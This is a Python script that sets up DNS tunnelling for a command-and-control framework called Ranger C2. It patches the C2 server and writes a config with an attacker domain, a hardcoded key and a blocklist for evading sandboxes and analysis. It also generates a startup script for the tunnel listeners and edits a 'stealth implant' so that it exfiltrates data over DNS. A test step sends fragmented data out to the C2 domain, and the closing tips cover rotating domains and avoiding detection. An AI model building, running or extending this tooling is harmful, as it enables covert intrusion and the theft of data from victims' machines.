#!/usr/bin/env python3
"""
Enable DNS tunneling in Ranger C2
"""

import os
import sys
import json
import time
import threading
from pathlib import Path

# Add current directory to path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

def enable_dns_in_c2():
    """Enable DNS tunneling in c2.py configuration."""
    c2_path = Path(__file__).parent / "c2.py"
    
    try:
        with open(c2_path, 'r') as f:
            content = f.read()
        
        # Check if DNS is already enabled
        if 'DNS_AVAILABLE = True' in content:
            print("✅ DNS already enabled in c2.py")
            return True
        
        # Find and update DNS_AVAILABLE setting
        lines = content.split('\n')
        updated = False
        
        for i, line in enumerate(lines):
            if 'DNS_AVAILABLE = False' in line:
                lines[i] = line.replace('DNS_AVAILABLE = False', 'DNS_AVAILABLE = True')
                updated = True
                break
        
        if updated:
            with open(c2_path, 'w') as f:
                f.write('\n'.join(lines))
            print("✅ Enabled DNS tunneling in c2.py")
            return True
        else:
            print("❌ Could not find DNS_AVAILABLE setting")
            return False
            
    except Exception as e:
        print(f"❌ Error enabling DNS in c2.py: {e}")
        return False

def update_dns_config():
    """Update DNS configuration with real domain."""
    config_path = Path(__file__).parent / "dns_config.json"
    
    config = {
        "enabled": True,
        "domain": "updates.rogue-c2.com",  # Change to your actual domain
        "listen_port": 5353,  # Use 53 for production (requires root)
        "upstream_dns": "8.8.8.8",
        "encryption_key": "RogueDNSTunnel2024",
        "chunk_size": 60,
        "jitter_min": 0.5,
        "jitter_max": 1.5,
        "max_chunks_per_session": 100,
        "session_timeout": 300,
        "auto_start": True,
        "log_queries": True,
        "blocklist": ["sandbox", "analysis", "virustotal", "malware"]
    }
    
    try:
        with open(config_path, 'w') as f:
            json.dump(config, f, indent=2)
        
        print("✅ Updated DNS configuration")
        return True
    except Exception as e:
        print(f"❌ Error updating DNS config: {e}")
        return False

def create_dns_startup_script():
    """Create script to start DNS tunnel with C2."""
    script_path = Path(__file__).parent / "start_dns_tunnel.sh"
    
    script = """#!/bin/bash
# Start Ranger C2 with DNS tunneling enabled

echo "Starting Ranger C2 with DNS tunneling..."

# Kill any existing C2 processes
pkill -f "python3 c2.py" 2>/dev/null
sleep 2

# Start DNS listener (requires root for port 53)
if [ "$EUID" -eq 0 ]; then
    echo "Starting DNS listener on port 53..."
    python3 -c "
import sys
sys.path.append('.')
from payloads.dnstunnel import DNSTunnel
import threading
import time

tunnel = DNSTunnel(
    domain='updates.rogue-c2.com',
    mode='server',
    listen_ip='0.0.0.0',
    listen_port=53
)

def run_dns():
    tunnel.start_server()

dns_thread = threading.Thread(target=run_dns, daemon=True)
dns_thread.start()
print('[+] DNS tunnel server started on port 53')

# Keep script running
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print('\\n[+] Stopping DNS tunnel...')
" &
    DNS_PID=$!
    echo "DNS listener PID: $DNS_PID"
else
    echo "Warning: Not running as root, DNS listener will use port 5353"
    python3 -c "
import sys
sys.path.append('.')
from payloads.dnstunnel import DNSTunnel
import threading
import time

tunnel = DNSTunnel(
    domain='updates.rogue-c2.com',
    mode='server',
    listen_ip='0.0.0.0',
    listen_port=5353
)

def run_dns():
    tunnel.start_server()

dns_thread = threading.Thread(target=run_dns, daemon=True)
dns_thread.start()
print('[+] DNS tunnel server started on port 5353')

# Keep script running
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print('\\n[+] Stopping DNS tunnel...')
" &
    DNS_PID=$!
    echo "DNS listener PID: $DNS_PID"
fi

# Start C2 server
echo "Starting C2 server on port 4444..."
python3 c2.py --enable-dns &
C2_PID=$!
echo "C2 server PID: $C2_PID"

echo ""
echo "=========================================="
echo "Ranger C2 with DNS tunneling is running!"
echo "=========================================="
echo "C2 Server: http://localhost:4444"
echo "DNS Domain: *.updates.rogue-c2.com"
echo "DNS Port: $(if [ "$EUID" -eq 0 ]; then echo 53; else echo 5353; fi)"
echo ""
echo "To stop: kill $C2_PID $DNS_PID"
echo "=========================================="

# Wait for user to press Ctrl+C
wait
"""
    
    try:
        with open(script_path, 'w') as f:
            f.write(script)
        
        # Make executable
        os.chmod(script_path, 0o755)
        
        print(f"✅ Created DNS startup script: {script_path}")
        return True
    except Exception as e:
        print(f"❌ Error creating startup script: {e}")
        return False

def test_dns_integration():
    """Test DNS integration with C2."""
    try:
        # Import DNS module
        sys.path.append(os.path.join(os.path.dirname(__file__), 'payloads'))
        from dnstunnel import DNSFragmenter, DNSTunnel
        
        print("Testing DNS integration...")
        
        # Test fragmenter
        fragmenter = DNSFragmenter("updates.rogue-c2.com")
        test_data = b"DNS tunneling test data"
        
        success = fragmenter.fragment_and_send(test_data, filename="test.txt", session_id="integration_test")
        
        if success:
            print("✅ DNS fragmenter integration test passed")
        else:
            print("❌ DNS fragmenter integration test failed")
            return False
        
        # Test tunnel client
        tunnel = DNSTunnel(
            domain="updates.rogue-c2.com",
            mode="client",
            upstream_dns="8.8.8.8"
        )
        
        response = tunnel.send_command("integration_test", use_fragmentation=True)
        print(f"DNS client response: {response}")
        
        print("✅ DNS integration tests complete")
        return True
        
    except Exception as e:
        print(f"❌ DNS integration test error: {e}")
        return False

def update_implant_for_dns():
    """Update stealth implant to use DNS tunneling."""
    implant_path = Path(__file__).parent / "payloads" / "stealth_implant_full.py"
    
    if not implant_path.exists():
        print("❌ Stealth implant not found")
        return False
    
    try:
        with open(implant_path, 'r') as f:
            content = f.read()
        
        # Check if DNS is already in exfil options
        if "'dns'" in content and "EXFIL_OPTIONS" in content:
            print("✅ DNS already in implant exfil options")
            return True
        
        # Find EXFIL_OPTIONS line
        lines = content.split('\n')
        updated = False
        
        for i, line in enumerate(lines):
            if "EXFIL_OPTIONS =" in line:
                # Update to include DNS
                if "'dns'" not in line:
                    lines[i] = "EXFIL_OPTIONS = ['https', 'dns', 'websocket', 'icmp', 'quic']"
                    updated = True
                break
        
        if updated:
            with open(implant_path, 'w') as f:
                f.write('\n'.join(lines))
            print("✅ Updated implant to include DNS exfiltration")
            return True
        else:
            print("❌ Could not find EXFIL_OPTIONS in implant")
            return False
            
    except Exception as e:
        print(f"❌ Error updating implant: {e}")
        return False

def main():
    """Main function."""
    print("Enabling DNS Tunneling in Ranger C2")
    print("="*60)
    
    steps = [
        ("Enable DNS in c2.py", enable_dns_in_c2),
        ("Update DNS configuration", update_dns_config),
        ("Update implant for DNS", update_implant_for_dns),
        ("Create startup script", create_dns_startup_script),
        ("Test DNS integration", test_dns_integration),
    ]
    
    all_passed = True
    for step_name, step_func in steps:
        print(f"\n{step_name}...")
        if step_func():
            print(f"✅ {step_name} completed")
        else:
            print(f"❌ {step_name} failed")
            all_passed = False
    
    print("\n" + "="*60)
    if all_passed:
        print("✅ DNS tunneling enabled successfully!")
        print("\nNext steps:")
        print("1. Configure your domain with wildcard DNS (*.updates.rogue-c2.com)")
        print("2. Update dns_config.json with your actual domain")
        print("3. Run: ./start_dns_tunnel.sh")
        print("4. Test with: python3 test_proper_implant_beacon.py --dns")
        print("\nFor production:")
        print("- Use port 53 (requires root)")
        print("- Set up DNS server with your domain")
        print("- Monitor DNS queries for detection")
        print("- Rotate domains regularly")
    else:
        print("❌ DNS tunneling setup incomplete")
        print("\nCheck the errors above and fix manually.")
    
    return 0 if all_passed else 1

if __name__ == "__main__":
    sys.exit(main())